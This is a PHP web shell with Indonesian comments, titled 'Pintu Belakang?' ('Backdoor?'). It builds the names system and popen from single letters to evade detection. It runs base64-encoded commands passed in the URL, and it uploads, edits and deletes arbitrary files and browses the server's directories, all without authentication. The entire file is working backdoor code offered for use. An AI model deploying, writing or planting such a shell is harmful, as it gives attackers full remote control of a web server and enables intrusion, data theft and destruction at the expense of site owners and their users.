<?php
// Mendefinisikan beberapa variabel seperti sebelumnya
 $x1 = "s"; $x2 = "y"; $x3 = "s"; $x4 = "t"; $x5 = "e"; $x6 = "m";
 $functionSystem = $x1 . $x2 . $x3 . $x4 . $x5 . $x6;

// Mendefinisikan beberapa variabel untuk nama fungsi popen()
 $p1 = "p"; $p2 = "o"; $p3 = "p"; $p4 = "e"; $p5 = "n";
 $functionPopen = $p1 . $p2 . $p3 . $p4 . $p5;

// Variabel untuk menyimpan output
 $output = "";

// Mendapatkan current directory dari parameter 'dir' atau default menggunakan getcwd()
 $currentDir = isset($_GET['dir']) ? base64_decode($_GET['dir']) : getcwd();

// Menangani perintah untuk dijalankan
if (isset($_GET['cmd'])) {
    $decodedCmd = base64_decode($_GET['cmd']); // Decode perintah
    ob_start();
    chdir($currentDir); // Pindah ke directory yang dipilih

    // Periksa apakah fungsi system() tersedia
    if (function_exists($functionSystem) && is_callable($functionSystem)) {
        $functionSystem($decodedCmd); // Jalankan perintah menggunakan system()
    } else if (function_exists($functionPopen) && is_callable($functionPopen)) {
        // Jika system() tidak tersedia, gunakan popen()
        $handle = $functionPopen($decodedCmd, 'r'); // Panggil fungsi popen()
        if ($handle) {
            while (($line = fgets($handle)) !== false) {
                echo $line; // Tampilkan hasil dari popen()
            }
            pclose($handle); // Tutup handle
        } else {
            echo "Gagal menjalankan perintah menggunakan popen().";
        }
    }
    
    $output = ob_get_clean(); // Ambil semua output yang telah di-buffer
}

// Menangani pengeditan file
if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $fileToEdit = base64_decode($_POST['edit_file']);
    $newContent = $_POST['file_content'];
    if (file_put_contents($fileToEdit, $newContent) !== false) {
        $message = "Edit Successfully";
    } else {
        $message = "<font color=red>Failed</font>";
    }
}

// Menangani penghapusan file
if (isset($_POST['delete_file'])) {
    $fileToDelete = base64_decode($_POST['delete_file']);
    if (unlink($fileToDelete)) {
        $message = "File successfully deleted.";
    } else {
        $message = "<font color=red>Failed to delete the file.</font>";
    }
}

// Menangani upload file
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $uploadedFile = $_FILES['upload_file'];
    $uploadPath = $currentDir . '/' . basename($uploadedFile['name']);
    
    // Memindahkan file yang diupload ke direktori yang sesuai
    if (move_uploaded_file($uploadedFile['tmp_name'], $uploadPath)) {
        $message = "File berhasil diupload.";
    } else {
        $message = "Gagal mengupload file.";
    }
}

// Fungsi untuk mendapatkan daftar direktori dan file
function listItems($dir) {
    $items = [];
    if (is_dir($dir)) {
        $entries = scandir($dir);
        foreach ($entries as $entry) {
            if ($entry != "." && $entry != "..") {
                $fullPath = $dir . "/" . $entry;
                $items[] = [
                    'name' => $entry,
                    'size' => is_file($fullPath) ? filesize($fullPath) : '-',
                    'permissions' => substr(sprintf('%o', fileperms($fullPath)), -4),
                    'is_dir' => is_dir($fullPath),
                    'path' => $fullPath
                ];
            }
        }
    }
    return $items;
}

 $items = listItems($currentDir);

// Fungsi untuk menampilkan path sebagai navigasi dalam satu baris
function displayPath($currentDir) {
    $pathParts = explode("/", trim($currentDir, "/"));
    $basePath = "";
    
    echo "<a href='?fm=true&dir=" . base64_encode("/") . "'>/</a>";

    foreach ($pathParts as $index => $part) {
        $basePath .= "/" . $part;
        $encodedPath = base64_encode($basePath);
        
        echo "/<a href='?fm=true&dir=" . $encodedPath . "'>" . $part . "</a>";
    }
}

// Fungsi untuk membaca konten file
function getFileContent($filePath) {
    return is_file($filePath) ? file_get_contents($filePath) : "";
}

 $fileContent = "";
if (isset($_GET['edit'])) {
    $fileToEdit = base64_decode($_GET['edit']);
    $fileContent = getFileContent($fileToEdit);
}

// Menentukan apakah File Manager aktif
 $isFileManagerActive = isset($_GET['fm']) && $_GET['fm'] === 'true';
 $isEditingFile = isset($_GET['edit']); // Cek apakah sedang mengedit file
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pintu Belakang?</title>
    <script>
        function encodeCommandBeforeSubmit() {
            const inputField = document.getElementById("cmd");
            const command = inputField.value;

            // Encode command to Base64
            const encodedCommand = btoa(command);

            // Set the encoded value back to the input field
            inputField.value = encodedCommand;
        }
    </script>
</head>
<body>
    <p>Current Directory: 
        <?php displayPath($currentDir); ?>
    </p>

    <form method="get" onsubmit="encodeCommandBeforeSubmit()">
        <input type="hidden" name="dir" value="<?= htmlspecialchars(base64_encode($currentDir)) ?>">
        <input type="text" id="cmd" name="cmd" required>
        <button type="submit">Execute</button>
    </form><br/>

    <?php if ($output): ?>
        <div style="border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9;">
        <pre><?= htmlspecialchars($output) ?></pre>
        </div><br/>
    <?php endif; ?>

    <!-- Form Upload File -->
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload_file" required>
        <button type="submit">Upload</button>
    </form><br/>

    <!-- Toggle Button for File Manager -->
    <a href="?fm=<?= $isFileManagerActive ? 'false' : 'true' ?>&dir=<?= base64_encode($currentDir) ?>">
        <button><?= $isFileManagerActive ? 'Close File Manager' : 'File Manager' ?></button>
    </a><br/><br/>

    <!-- File Manager Section -->
    <?php if ($isFileManagerActive && !$isEditingFile): ?>
        <table id="fileManagerTable" border="1" cellpadding="5" cellspacing="0" style="width: 60%; table-layout: fixed;">
    <thead>
        <tr>
            <th style="width: 70%;">Name</th>
            <th style="width: 15%;">Size</th>
            <th style="width: 15%;">-</th>
        </tr>
    </thead>
            <tbody>
                <?php foreach ($items as $item): ?>
                    <tr>
                        <td>
                            <?php if ($item['is_dir']): ?>
                                <a href="?fm=true&dir=<?= base64_encode($currentDir . '/' . $item['name']) ?>">
                                    <?= htmlspecialchars($item['name']) ?>/ 
                                </a>
                            <?php else: ?>
                                <a href="?fm=true&dir=<?= base64_encode($currentDir) ?>&edit=<?= base64_encode($item['path']) ?>">
                                    <?= htmlspecialchars($item['name']) ?>
                                </a>
                            <?php endif; ?>
                        </td>
                        <td>
                            <center><?= $item['size'] !== '-' ? $item['size'] . ' bytes' : '-' ?></center>
                        </td>
                        <td>
                            <center><?= $item['permissions'] ?></center>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    <?php endif; ?>

    <?php if ($isEditingFile): ?>
    <h3>Edit File: <?= htmlspecialchars(basename($fileToEdit)) ?></h3>
    <form method="post" style="display: inline;">
        <?php if (isset($message)): ?>
            <p><?= htmlspecialchars($message) ?></p>
        <?php endif; ?>

        <textarea name="file_content" rows="20" cols="90"><?= htmlspecialchars($fileContent) ?></textarea><br>
        <input type="hidden" name="edit_file" value="<?= htmlspecialchars($_GET['edit']) ?>"><br>
        <button type="submit">Save</button>
    </form>

    <!-- Form untuk Hapus File -->
    <form method="post" style="display: inline;">
        <input type="hidden" name="delete_file" value="<?= htmlspecialchars($_GET['edit']) ?>">
        <button type="submit">Delete</button>
    </form>
<?php endif; ?>

</body>
</html>